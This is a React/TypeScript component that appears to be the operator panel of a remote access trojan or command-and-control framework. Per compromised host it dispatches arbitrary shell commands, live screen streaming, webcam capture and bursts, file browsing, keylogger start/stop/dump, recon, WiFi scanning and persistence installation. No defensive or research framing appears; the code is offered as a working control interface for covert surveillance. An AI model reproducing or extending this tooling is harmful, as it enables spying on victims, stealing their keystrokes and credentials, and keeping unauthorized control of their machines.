import { useState, useEffect, useRef, useCallback } from 'react'
import { useQuery, useMutation, useQueryClient } from '@tanstack/react-query'
import { motion, AnimatePresence } from 'framer-motion'
import {
  X, ChevronLeft, Send, Camera, Keyboard, Terminal, Monitor, Cpu, Globe,
  Clock, HardDrive, User, CheckCircle2, XCircle, Loader2, ArrowLeft,
  FileText, Wifi, Shield, ScanLine, Video, FolderTree, Zap, RefreshCw,
  Activity, Power, Trash2, Download,
} from 'lucide-react'
import { useUIStore } from '../stores/uiStore'
import { useAgent } from '../hooks/useAgents'
import { useTasks } from '../hooks/useTasks'
import { createTask } from '../api/tasks'
import { useWebSocket } from '../hooks/useWebSocket'
import { useToast } from '../contexts/ToastContext'
import { StatusBadge } from './ui/StatusBadge'
import api from '../api/client'

// ---------------------------------------------------------------------------
// Types
// ---------------------------------------------------------------------------

type TabId = 'overview' | 'shell' | 'remote' | 'camera' | 'screenshot' | 'files' | 'keylog' | 'tasks'

interface Tab { id: TabId; label: string; icon: React.ElementType }

const TABS: Tab[] = [
  { id: 'overview',  label: 'Overview',  icon: Activity },
  { id: 'shell',     label: 'Shell',     icon: Terminal },
  { id: 'remote',    label: 'Remote',    icon: Monitor },
  { id: 'camera',    label: 'Camera',    icon: Video },
  { id: 'screenshot',label: 'Screen',    icon: Camera },
  { id: 'files',     label: 'Files',     icon: FolderTree },
  { id: 'keylog',    label: 'Keylog',    icon: Keyboard },
  { id: 'tasks',     label: 'Tasks',     icon: FileText },
]

interface ChatMessage {
  id: string
  kind: 'command' | 'result'
  module: string
  action: string
  text: string
  status?: 'pending' | 'completed' | 'failed' | 'running'
  timestamp: number
}

// ---------------------------------------------------------------------------
// Main component
// ---------------------------------------------------------------------------

export function AgentDrawer() {
  const { drawerAgentId, drawerOpen, closeDrawer } = useUIStore()
  const { on } = useWebSocket()
  const qc = useQueryClient()
  const toast = useToast()

  const agentId = drawerAgentId
  const { data: agent, isLoading } = useAgent(agentId || '')
  const { data: tasks = [] } = useTasks(agentId ? { agent_id: agentId } : undefined)

  const [activeTab, setActiveTab] = useState<TabId>('overview')
  const [messages, setMessages] = useState<ChatMessage[]>([])
  const scrollRef = useRef<HTMLDivElement>(null)

  // Reset tab + messages when agent changes
  useEffect(() => {
    setActiveTab('overview')
    setMessages([])
  }, [agentId])

  // WebSocket: listen for task results for this agent
  useEffect(() => {
    if (!agentId) return
    const unsub = on('result', (msg) => {
      const payload = msg.payload as any
      if (msg.agent_id !== agentId) return
      const taskId = payload?.id || payload?.task_id || msg.task_id
      if (!taskId) return
      setMessages((prev) =>
        prev.map((m) =>
          m.id === taskId + '_res'
            ? { ...m, status: payload.status || 'completed', text: formatPayloadResult(payload) }
            : m
        )
      )
    })
    return unsub
  }, [agentId, on])

  // Esc to close
  useEffect(() => {
    const handler = (e: KeyboardEvent) => {
      if (e.key === 'Escape' && drawerOpen) closeDrawer()
    }
    window.addEventListener('keydown', handler)
    return () => window.removeEventListener('keydown', handler)
  }, [drawerOpen, closeDrawer])

  const createMut = useMutation({
    mutationFn: createTask,
    onSuccess: (task) => {
      qc.invalidateQueries({ queryKey: ['tasks'] })
      setMessages((prev) => [
        ...prev,
        { id: task.id + '_res', kind: 'result', module: task.module, action: task.action, text: 'Waiting for agent…', status: 'pending', timestamp: Date.now() },
      ])
    },
    onError: (err: any) => {
      toast.addToast({ type: 'error', title: 'Dispatch failed', message: err?.message || 'Could not create task.' })
    },
  })

  const dispatch = useCallback(
    (module: string, action: string, params: Record<string, unknown> = {}, label?: string) => {
      if (!agentId) return
      const cmdId = `cmd_${Date.now()}_${Math.random().toString(36).slice(2, 7)}`
      setMessages((prev) => [
        ...prev,
        { id: cmdId, kind: 'command', module, action, text: label || `${module} ${action}`, status: 'pending', timestamp: Date.now() },
      ])
      createMut.mutate({ agent_id: agentId, module, action, params, priority: 'normal' } as any)
    },
    [agentId, createMut]
  )

  const osIcon = (os: string) => {
    const lower = (os || '').toLowerCase()
    if (lower.includes('win')) return '🪟'
    if (lower.includes('darwin')) return '🍎'
    return '🐧'
  }

  return (
    <AnimatePresence>
      {drawerOpen && (
        <>
          {/* Backdrop */}
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            transition={{ duration: 0.2 }}
            className="fixed inset-0 bg-black/50 z-40 backdrop-blur-sm"
            onClick={closeDrawer}
          />

          {/* Drawer */}
          <motion.div
            initial={{ x: '100%' }}
            animate={{ x: 0 }}
            exit={{ x: '100%' }}
            transition={{ type: 'spring', damping: 30, stiffness: 300 }}
            className="fixed right-0 top-0 bottom-0 w-full sm:w-[520px] lg:w-[600px] bg-base-100 z-50 shadow-2xl flex flex-col"
          >
            {/* === Header === */}
            <div className="flex items-center gap-3 p-4 border-b border-base-300 bg-base-200/50">
              <button onClick={closeDrawer} className="btn btn-ghost btn-sm btn-square">
                <ChevronLeft size={16} />
              </button>
              {isLoading ? (
                <div className="flex-1"><span className="loading loading-spinner loading-sm" /></div>
              ) : agent ? (
                <div className="flex-1 min-w-0">
                  <div className="flex items-center gap-2">
                    <span className="text-xl">{osIcon(agent.os)}</span>
                    <h2 className="font-bold text-sm truncate">{agent.hostname}</h2>
                    <StatusBadge status={agent.status} />
                  </div>
                  <p className="text-[10px] text-base-content/50 font-mono truncate mt-0.5">
                    {agent.ip_public || agent.ip_private || 'no ip'} · {agent.os} · {agent.username}
                  </p>
                </div>
              ) : (
                <div className="flex-1 text-error text-sm">Agent not found</div>
              )}
              <button onClick={closeDrawer} className="btn btn-ghost btn-sm btn-square">
                <X size={16} />
              </button>
            </div>

            {/* === Tabs === */}
            {agent && (
              <div className="flex items-center gap-0.5 px-2 border-b border-base-300 bg-base-200/30 overflow-x-auto scrollbar-thin">
                {TABS.map((tab) => {
                  const Icon = tab.icon
                  const active = activeTab === tab.id
                  return (
                    <button
                      key={tab.id}
                      onClick={() => setActiveTab(tab.id)}
                      className={`flex items-center gap-1.5 px-3 py-2.5 text-xs font-medium whitespace-nowrap border-b-2 transition-all ${
                        active
                          ? 'border-success text-success'
                          : 'border-transparent text-base-content/50 hover:text-base-content'
                      }`}
                    >
                      <Icon size={13} />
                      {tab.label}
                    </button>
                  )
                })}
              </div>
            )}

            {/* === Tab content === */}
            <div ref={scrollRef} className="flex-1 overflow-y-auto scrollbar-thin">
              {agent && (
                <>
                  {activeTab === 'overview'  && <OverviewTab agent={agent} dispatch={dispatch} />}
                  {activeTab === 'shell'     && <ShellTab agentId={agentId || ''} messages={messages} setMessages={setMessages} dispatch={dispatch} scrollRef={scrollRef} />}
                  {activeTab === 'remote'    && <RemoteTab agentId={agentId || ''} agent={agent} dispatch={dispatch} />}
                  {activeTab === 'camera'    && <CameraTab agentId={agentId || ''} dispatch={dispatch} />}
                  {activeTab === 'screenshot' && <ScreenshotTab agentId={agentId || ''} dispatch={dispatch} />}
                  {activeTab === 'files'     && <FilesTab agentId={agentId || ''} dispatch={dispatch} />}
                  {activeTab === 'keylog'    && <KeylogTab agentId={agentId || ''} dispatch={dispatch} />}
                  {activeTab === 'tasks'     && <TasksTab agentId={agentId || ''} tasks={tasks} />}
                </>
              )}
            </div>
          </motion.div>
        </>
      )}
    </AnimatePresence>
  )
}

// ===========================================================================
// Tab: Overview
// ===========================================================================

function OverviewTab({ agent, dispatch }: { agent: any; dispatch: (m: string, a: string, p?: Record<string, unknown>, l?: string) => void }) {
  const specs = [
    { icon: Cpu,      label: 'CPU',      value: agent.architecture || '—' },
    { icon: HardDrive, label: 'RAM',     value: agent.ram_total ? `${(agent.ram_total / 1024 / 1024 / 1024).toFixed(1)}GB` : '—' },
    { icon: Globe,    label: 'IP',       value: agent.ip_public || '—' },
    { icon: User,     label: 'User',     value: agent.username || '—' },
    { icon: Clock,    label: 'Seen',     value: agent.last_seen ? new Date(agent.last_seen).toLocaleTimeString() : '—' },
  ]

  const quickActions = [
    { module: 'screenshot', action: 'capture', icon: Camera, label: 'Screenshot', color: 'btn-info' },
    { module: 'shell', action: 'exec', icon: Terminal, label: 'Shell', color: 'btn-success', params: { cmd: 'whoami' } },
    { module: 'webcam', action: 'capture', icon: Video, label: 'Camera', color: 'btn-warning' },
    { module: 'wifi', action: 'scan', icon: Wifi, label: 'WiFi', color: 'btn-ghost' },
    { module: 'recon', action: 'run', icon: ScanLine, label: 'Recon', color: 'btn-info' },
    { module: 'persistence', action: 'install', icon: Shield, label: 'Persist', color: 'btn-warning' },
  ]

  return (
    <div className="p-4 space-y-4">
      {/* Specs */}
      <div className="grid grid-cols-2 gap-2">
        {specs.map((s) => {
          const Icon = s.icon
          return (
            <div key={s.label} className="flex items-center gap-2 p-2.5 rounded-lg bg-base-200">
              <Icon size={14} className="text-base-content/40 shrink-0" />
              <div className="min-w-0">
                <p className="text-[9px] uppercase tracking-wider text-base-content/40">{s.label}</p>
                <p className="text-xs font-mono truncate">{s.value}</p>
              </div>
            </div>
          )
        })}
      </div>

      {/* Quick actions grid */}
      <div>
        <h3 className="text-xs font-bold uppercase tracking-wider text-base-content/50 mb-2">Quick Actions</h3>
        <div className="grid grid-cols-3 gap-2">
          {quickActions.map((qa) => {
            const Icon = qa.icon
            return (
              <button
                key={qa.label}
                onClick={() => dispatch(qa.module, qa.action, qa.params || {}, qa.label)}
                className={`btn btn-sm ${qa.color} gap-1 flex-col h-auto py-2.5`}
              >
                <Icon size={16} />
                <span className="text-[10px]">{qa.label}</span>
              </button>
            )
          })}
        </div>
      </div>

      {/* Danger zone */}
      <div>
        <h3 className="text-xs font-bold uppercase tracking-wider text-error/60 mb-2">Danger Zone</h3>
        <div className="flex gap-2">
          <button
            onClick={() => dispatch('persistence', 'remove', {}, 'Remove persistence')}
            className="btn btn-sm btn-error btn-outline gap-1"
          >
            <Trash2 size={12} /> Unpersist
          </button>
        </div>
      </div>
    </div>
  )
}

// ===========================================================================
// Tab: Shell
// ===========================================================================

function ShellTab({ agentId, messages, setMessages, dispatch, scrollRef }: {
  agentId: string
  messages: ChatMessage[]
  setMessages: React.Dispatch<React.SetStateAction<ChatMessage[]>>
  dispatch: (m: string, a: string, p?: Record<string, unknown>, l?: string) => void
  scrollRef: React.RefObject<HTMLDivElement>
}) {
  const [input, setInput] = useState('')
  const inputRef = useRef<HTMLInputElement>(null)

  useEffect(() => {
    if (scrollRef.current) scrollRef.current.scrollTop = scrollRef.current.scrollHeight
  }, [messages, scrollRef])

  // Load recent shell history
  useEffect(() => {
    if (!agentId) return
    api.get<any[]>(`/tasks?agent_id=${agentId}&limit=30`).then((r) => {
      const history: ChatMessage[] = r.data
        .filter((t) => t.module === 'shell')
        .reverse()
        .flatMap((t) => [
          { id: t.id + '_cmd', kind: 'command' as const, module: 'shell', action: 'exec', text: t.params?.cmd || '$ ...', status: undefined as any, timestamp: new Date(t.created_at).getTime() },
          { id: t.id + '_res', kind: 'result' as const, module: 'shell', action: 'exec', text: formatTaskResult(t), status: t.status, timestamp: new Date(t.created_at).getTime() + 1 },
        ])
      setMessages(history)
    }).catch(() => {})
  }, [agentId, setMessages])

  const handleSend = () => {
    if (!input.trim()) return
    dispatch('shell', 'exec', { cmd: input.trim() }, `$ ${input.trim()}`)
    setInput('')
  }

  return (
    <div className="flex flex-col h-full">
      {/* Terminal output */}
      <div className="flex-1 overflow-y-auto scrollbar-thin p-3 space-y-2 min-h-[300px]">
        {messages.length === 0 && (
          <div className="flex flex-col items-center justify-center h-full text-center space-y-2 text-base-content/30">
            <Terminal size={28} />
            <p className="text-xs">Type a command below</p>
          </div>
        )}
        {messages.map((msg) => <ChatBubble key={msg.id} msg={msg} />)}
      </div>

      {/* Input */}
      <div className="flex items-center gap-2 p-3 border-t border-base-300 bg-base-100 sticky bottom-0">
        <span className="text-success font-mono text-xs shrink-0">$</span>
        <input
          ref={inputRef}
          className="input input-sm input-bordered w-full font-mono"
          value={input}
          onChange={(e) => setInput(e.target.value)}
          onKeyDown={(e) => { if (e.key === 'Enter') handleSend() }}
          placeholder="shell command…"
          autoFocus
        />
        <motion.button whileTap={{ scale: 0.9 }} onClick={handleSend} disabled={!input.trim()} className="btn btn-sm btn-success btn-square">
          <Send size={14} />
        </motion.button>
      </div>
    </div>
  )
}

// ===========================================================================
// Tab: Remote Desktop
// ===========================================================================

function RemoteTab({ agentId, agent, dispatch }: { agentId: string; agent: any; dispatch: any }) {
  const [streaming, setStreaming] = useState(false)
  const [quality, setQuality] = useState(60)
  const [fps, setFps] = useState(2)
  const { on } = useWebSocket()
  const [lastFrame, setLastFrame] = useState<string | null>(null)

  useEffect(() => {
    const unsub = on('result', (msg) => {
      if (msg.agent_id !== agentId) return
      const p = msg.payload as any
      if ((p?.module === 'screenshot' || p?.module === 'screen_stream') && p?.data?.image_b64) {
        setLastFrame(p.data.image_b64)
      }
    })
    return unsub
  }, [on, agentId])

  const startStream = () => {
    dispatch('screenshot', 'stream_start', { interval: Math.max(0.5, 1 / fps), quality, max_frames: 9999, width: 1280 }, `Remote stream ${fps}fps q${quality}`)
    setStreaming(true)
  }

  const stopStream = () => {
    setStreaming(false)
    setLastFrame(null)
  }

  return (
    <div className="p-4 space-y-4">
      <div className="flex items-center justify-between">
        <h3 className="font-semibold text-sm flex items-center gap-2"><Monitor size={16} /> Remote Desktop</h3>
        <span className={`badge badge-xs ${streaming ? 'badge-success animate-pulse' : 'badge-ghost'}`}>
          {streaming ? '● LIVE' : 'OFF'}
        </span>
      </div>

      {/* Screen preview */}
      <div className="rounded-lg overflow-hidden border border-base-300 bg-black aspect-video flex items-center justify-center">
        {lastFrame ? (
          <img src={`data:image/jpeg;base64,${lastFrame}`} alt="remote screen" className="w-full h-full object-contain" />
        ) : (
          <div className="text-base-content/30 text-xs flex flex-col items-center gap-2">
            <Monitor size={32} />
            <p>No stream active</p>
          </div>
        )}
      </div>

      {/* Controls */}
      <div className="space-y-3">
        <label className="flex items-center justify-between text-xs">
          <span className="text-base-content/60">Quality: {quality}%</span>
          <input type="range" min={20} max={90} value={quality} onChange={(e) => setQuality(Number(e.target.value))} className="range range-xs range-success w-32" disabled={streaming} />
        </label>
        <label className="flex items-center justify-between text-xs">
          <span className="text-base-content/60">FPS: {fps}</span>
          <input type="range" min={1} max={10} value={fps} onChange={(e) => setFps(Number(e.target.value))} className="range range-xs range-info w-32" disabled={streaming} />
        </label>
      </div>

      <div className="flex gap-2">
        {!streaming ? (
          <button onClick={startStream} className="btn btn-sm btn-success gap-1 flex-1" disabled={agent.status === 'offline'}>
            <Video size={14} /> Start stream
          </button>
        ) : (
          <button onClick={stopStream} className="btn btn-sm btn-error gap-1 flex-1">
            <Power size={14} /> Stop
          </button>
        )}
        <button onClick={() => dispatch('screenshot', 'capture', { quality, width: 1920 }, 'Single screenshot')} className="btn btn-sm btn-outline gap-1">
          <Camera size={14} /> Snap
        </button>
      </div>
      {agent.status === 'offline' && <p className="text-[10px] text-error/60 text-center">Agent is offline — cannot stream.</p>}
    </div>
  )
}

// ===========================================================================
// Tab: Camera
// ===========================================================================

function CameraTab({ agentId, dispatch }: { agentId: string; dispatch: any }) {
  const [burstCount, setBurstCount] = useState(1)
  const [lastImage, setLastImage] = useState<string | null>(null)
  const { on } = useWebSocket()

  useEffect(() => {
    const unsub = on('result', (msg) => {
      if (msg.agent_id !== agentId) return
      const p = msg.payload as any
      if (p?.module === 'webcam' || p?.data?.image_b64) {
        const img = p?.data?.image_b64 || p?.data?.frames?.[0]
        if (img) setLastImage(img)
      }
    })
    return unsub
  }, [on, agentId])

  return (
    <div className="p-4 space-y-4">
      <h3 className="font-semibold text-sm flex items-center gap-2"><Video size={16} /> Webcam Control</h3>

      {/* Preview */}
      <div className="rounded-lg overflow-hidden border border-base-300 bg-black aspect-video flex items-center justify-center">
        {lastImage ? (
          <img src={`data:image/jpeg;base64,${lastImage}`} alt="webcam" className="w-full h-full object-contain" />
        ) : (
          <div className="text-base-content/30 text-xs flex flex-col items-center gap-2">
            <Video size={32} />
            <p>No capture yet</p>
          </div>
        )}
      </div>

      {/* Burst count */}
      <label className="flex items-center justify-between text-xs">
        <span className="text-base-content/60">Burst frames: {burstCount}</span>
        <input type="range" min={1} max={10} value={burstCount} onChange={(e) => setBurstCount(Number(e.target.value))} className="range range-xs range-warning w-32" />
      </label>

      {/* Actions */}
      <div className="flex gap-2">
        <button onClick={() => { dispatch('webcam', 'capture', { quality: 70 }, 'Webcam capture'); }} className="btn btn-sm btn-warning gap-1 flex-1">
          <Camera size={14} /> Capture
        </button>
        <button onClick={() => dispatch('webcam', 'burst', { count: burstCount, interval: 1 }, `Burst ${burstCount} frames`)} className="btn btn-sm btn-outline gap-1">
          <Zap size={14} /> Burst
        </button>
        <button onClick={() => dispatch('webcam', 'list', {}, 'List devices')} className="btn btn-sm btn-ghost gap-1">
          <RefreshCw size={14} /> List
        </button>
      </div>
    </div>
  )
}

// ===========================================================================
// Tab: Screenshot
// ===========================================================================

function ScreenshotTab({ agentId, dispatch }: { agentId: string; dispatch: any }) {
  const [lastShot, setLastShot] = useState<string | null>(null)
  const [quality, setQuality] = useState(75)
  const { on } = useWebSocket()

  useEffect(() => {
    const unsub = on('result', (msg) => {
      if (msg.agent_id !== agentId) return
      const p = msg.payload as any
      if (p?.module === 'screenshot' || p?.data?.image_b64) {
        const img = p?.data?.image_b64 || p?.data?.frames?.[0]
        if (img) setLastShot(img)
      }
    })
    return unsub
  }, [on, agentId])

  const download = () => {
    if (!lastShot) return
    const a = document.createElement('a')
    a.href = `data:image/jpeg;base64,${lastShot}`
    a.download = `screenshot_${agentId}_${Date.now()}.jpg`
    a.click()
  }

  return (
    <div className="p-4 space-y-4">
      <h3 className="font-semibold text-sm flex items-center gap-2"><Camera size={16} /> Screenshot</h3>

      <div className="rounded-lg overflow-hidden border border-base-300 bg-black aspect-video flex items-center justify-center">
        {lastShot ? (
          <img src={`data:image/jpeg;base64,${lastShot}`} alt="screenshot" className="w-full h-full object-contain" />
        ) : (
          <div className="text-base-content/30 text-xs flex flex-col items-center gap-2">
            <Camera size={32} />
            <p>No screenshot yet</p>
          </div>
        )}
      </div>

      <label className="flex items-center justify-between text-xs">
        <span className="text-base-content/60">Quality: {quality}%</span>
        <input type="range" min={20} max={100} value={quality} onChange={(e) => setQuality(Number(e.target.value))} className="range range-xs range-info w-32" />
      </label>

      <div className="flex gap-2">
        <button onClick={() => dispatch('screenshot', 'capture', { quality, width: 1920 }, 'Screenshot')} className="btn btn-sm btn-info gap-1 flex-1">
          <Camera size={14} /> Capture
        </button>
        {lastShot && (
          <button onClick={download} className="btn btn-sm btn-outline gap-1">
            <Download size={14} /> Save
          </button>
        )}
      </div>
    </div>
  )
}

// ===========================================================================
// Tab: Files
// ===========================================================================

function FilesTab({ agentId, dispatch }: { agentId: string; dispatch: any }) {
  const [path, setPath] = useState('C:\\')
  const [fileList, setFileList] = useState<any[] | null>(null)
  const { on } = useWebSocket()

  useEffect(() => {
    const unsub = on('result', (msg) => {
      if (msg.agent_id !== agentId) return
      const p = msg.payload as any
      if (p?.module === 'file' && p?.data?.entries) {
        setFileList(p.data.entries)
      }
    })
    return unsub
  }, [on, agentId])

  const browse = (p: string) => {
    setPath(p)
    setFileList(null)
    dispatch('file', 'list', { path: p }, `Browse ${p}`)
  }

  return (
    <div className="p-4 space-y-3">
      <h3 className="font-semibold text-sm flex items-center gap-2"><FolderTree size={16} /> File Browser</h3>

      {/* Path bar */}
      <div className="flex gap-2">
        <input
          className="input input-sm input-bordered w-full font-mono"
          value={path}
          onChange={(e) => setPath(e.target.value)}
          onKeyDown={(e) => { if (e.key === 'Enter') browse(path) }}
          placeholder="C:\ or /home/user"
        />
        <button onClick={() => browse(path)} className="btn btn-sm btn-success gap-1">
          <RefreshCw size={12} /> Go
        </button>
      </div>

      {/* Quick paths */}
      <div className="flex gap-1 flex-wrap">
        {['C:\\', 'C:\\Users', 'C:\\Windows\\Temp', '/', '/tmp', '/home'].map((p) => (
          <button key={p} onClick={() => browse(p)} className="btn btn-xs btn-ghost font-mono">{p}</button>
        ))}
      </div>

      {/* File list */}
      {fileList && (
        <div className="rounded-lg border border-base-300 overflow-hidden">
          <table className="table table-xs w-full">
            <thead className="bg-base-200">
              <tr><th>Name</th><th>Size</th><th>Modified</th></tr>
            </thead>
            <tbody>
              {fileList.map((f: any, i: number) => (
                <tr key={i} className="hover cursor-pointer" onClick={() => f.is_dir && browse(f.path)}>
                  <td className="font-mono text-xs">
                    {f.is_dir ? '📁' : '📄'} {f.name}
                  </td>
                  <td className="text-xs text-base-content/50">{f.size ? `${(f.size / 1024).toFixed(1)}KB` : '—'}</td>
                  <td className="text-xs text-base-content/50">{f.modified || '—'}</td>
                </tr>
              ))}
              {fileList.length === 0 && <tr><td colSpan={3} className="text-center text-base-content/30 py-4">Empty or waiting…</td></tr>}
            </tbody>
          </table>
        </div>
      )}

      {!fileList && (
        <p className="text-xs text-base-content/40 text-center py-4">Click Go to browse files on the agent.</p>
      )}
    </div>
  )
}

// ===========================================================================
// Tab: Keylogger
// ===========================================================================

function KeylogTab({ agentId, dispatch }: { agentId: string; dispatch: any }) {
  const [running, setRunning] = useState(false)
  const [buffer, setBuffer] = useState<string>('')
  const { on } = useWebSocket()

  useEffect(() => {
    const unsub = on('result', (msg) => {
      if (msg.agent_id !== agentId) return
      const p = msg.payload as any
      if (p?.module === 'keylog') {
        if (p?.data?.keys) setBuffer((prev) => prev + p.data.keys)
        if (p?.data?.buffer) setBuffer(p.data.buffer)
      }
    })
    return unsub
  }, [on, agentId])

  return (
    <div className="p-4 space-y-4">
      <h3 className="font-semibold text-sm flex items-center gap-2"><Keyboard size={16} /> Keylogger</h3>

      <div className="flex gap-2">
        {!running ? (
          <button onClick={() => { dispatch('keylog', 'start', {}, 'Start keylogger'); setRunning(true) }} className="btn btn-sm btn-warning gap-1 flex-1">
            <Keyboard size={14} /> Start
          </button>
        ) : (
          <button onClick={() => { dispatch('keylog', 'stop', {}, 'Stop keylogger'); setRunning(false) }} className="btn btn-sm btn-error gap-1 flex-1">
            <Power size={14} /> Stop
          </button>
        )}
        <button onClick={() => dispatch('keylog', 'dump', {}, 'Dump buffer')} className="btn btn-sm btn-outline gap-1">
          <Download size={14} /> Dump
        </button>
        <button onClick={() => setBuffer('')} className="btn btn-sm btn-ghost gap-1">
          <Trash2 size={14} /> Clear
        </button>
      </div>

      {/* Captured output */}
      <div className="rounded-lg border border-base-300 bg-base-200 p-3 min-h-[200px] max-h-[400px] overflow-y-auto scrollbar-thin">
        <pre className="text-xs font-mono whitespace-pre-wrap break-all text-base-content/70">
          {buffer || 'No keystrokes captured yet. Start the keylogger and wait for input.'}
        </pre>
      </div>
    </div>
  )
}

// ===========================================================================
// Tab: Tasks
// ===========================================================================

function TasksTab({ agentId, tasks }: { agentId: string; tasks: any[] }) {
  return (
    <div className="p-4 space-y-3">
      <h3 className="font-semibold text-sm flex items-center gap-2"><FileText size={16} /> Task History ({tasks.length})</h3>

      <div className="space-y-1.5 max-h-[500px] overflow-y-auto scrollbar-thin">
        {tasks.length === 0 && <p className="text-xs text-base-content/40 text-center py-4">No tasks yet.</p>}
        {tasks.map((t) => (
          <div key={t.id} className="flex items-center gap-2 p-2.5 rounded-lg bg-base-200 hover:bg-base-300/50 transition-colors">
            <div className="shrink-0">
              {t.status === 'completed' ? <CheckCircle2 size={14} className="text-success" /> :
               t.status === 'failed' ? <XCircle size={14} className="text-error" /> :
               t.status === 'running' ? <Loader2 size={14} className="text-warning animate-spin" /> :
               <Clock size={14} className="text-base-content/30" />}
            </div>
            <div className="flex-1 min-w-0">
              <p className="text-xs font-mono truncate">
                <span className="text-success">{t.module}</span> › {t.action}
              </p>
              <p className="text-[10px] text-base-content/40 truncate">
                {t.params?.cmd || t.params?.path || JSON.stringify(t.params || {}).slice(0, 60)}
              </p>
            </div>
            <span className="text-[9px] text-base-content/30 shrink-0">
              {t.created_at ? new Date(t.created_at).toLocaleTimeString() : ''}
            </span>
          </div>
        ))}
      </div>
    </div>
  )
}

// ===========================================================================
// Chat bubble (shared)
// ===========================================================================

function ChatBubble({ msg }: { msg: ChatMessage }) {
  const isCommand = msg.kind === 'command'
  const time = new Date(msg.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
  const StatusIcon = msg.status === 'completed' ? CheckCircle2 : msg.status === 'failed' ? XCircle : msg.status === 'running' ? Loader2 : null

  return (
    <motion.div
      initial={{ opacity: 0, y: 8 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.15 }}
      className={`flex ${isCommand ? 'justify-end' : 'justify-start'}`}
    >
      <div className={`max-w-[85%] rounded-2xl px-3 py-2 text-xs ${
        isCommand
          ? 'bg-success/15 text-success rounded-br-sm border border-success/20'
          : msg.status === 'failed'
          ? 'bg-error/10 text-error rounded-bl-sm border border-error/20'
          : 'bg-base-300 text-base-content/80 rounded-bl-sm'
      }`}>
        <div className="flex items-center gap-1.5 mb-0.5">
          {isCommand ? (
            <>
              <span className="font-mono font-bold text-[9px] uppercase opacity-70">{msg.module} › {msg.action}</span>
              {msg.status === 'pending' && <Loader2 size={9} className="animate-spin opacity-50" />}
            </>
          ) : (
            <>
              {StatusIcon && <StatusIcon size={10} className={msg.status === 'completed' ? 'text-success' : msg.status === 'failed' ? 'text-error' : 'animate-spin text-warning'} />}
              <span className="font-mono font-bold text-[8px] uppercase opacity-50">{msg.module}</span>
            </>
          )}
        </div>
        <div className="font-mono text-[11px] leading-relaxed break-all">{msg.text}</div>
        <div className={`text-[7px] mt-0.5 text-right ${isCommand ? 'text-success/40' : 'text-base-content/30'}`}>{time}</div>
      </div>
    </motion.div>
  )
}

// ===========================================================================
// Helpers
// ===========================================================================

function formatTaskResult(task: any): string {
  if (task.result_output) {
    try {
      const parsed = typeof task.result_output === 'string' ? JSON.parse(task.result_output) : task.result_output
      if (parsed?.data) return JSON.stringify(parsed.data, null, 2).slice(0, 500)
      if (parsed?.error) return `Error: ${parsed.error}`
      return JSON.stringify(parsed, null, 2).slice(0, 500)
    } catch { return String(task.result_output).slice(0, 500) }
  }
  if (task.result) {
    try {
      const parsed = typeof task.result === 'string' ? JSON.parse(task.result) : task.result
      if (parsed?.data) return JSON.stringify(parsed.data, null, 2).slice(0, 500)
      if (parsed?.error) return `Error: ${parsed.error}`
      return JSON.stringify(parsed, null, 2).slice(0, 500)
    } catch { return String(task.result).slice(0, 500) }
  }
  if (task.error) return `Error: ${task.error}`
  return task.status || '—'
}

function formatPayloadResult(payload: any): string {
  if (payload?.data) return typeof payload.data === 'string' ? payload.data.slice(0, 500) : JSON.stringify(payload.data, null, 2).slice(0, 500)
  if (payload?.error) return `Error: ${payload.error}`
  if (payload?.result_output) return formatTaskResult({ result_output: payload.result_output })
  if (payload?.result) return formatTaskResult({ result: payload.result })
  return JSON.stringify(payload, null, 2).slice(0, 500)
}
